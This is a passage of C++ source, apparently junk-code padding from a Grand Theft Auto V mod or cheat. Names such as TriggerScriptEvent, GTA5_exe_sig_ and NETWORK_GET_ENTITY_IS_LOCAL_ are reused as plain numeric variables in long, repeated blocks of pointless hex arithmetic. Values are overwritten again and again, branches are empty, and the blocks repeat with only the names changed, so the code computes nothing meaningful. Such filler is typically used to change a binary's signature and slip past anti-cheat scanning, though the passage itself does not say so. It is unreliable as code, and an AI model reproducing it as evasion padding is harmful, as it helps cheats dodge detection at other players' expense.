			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Mod1_c>-1</Mod1_c>");
			Extern_Reader::LOG::LogSemHora("<Mod2_a>6</Mod2_a>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
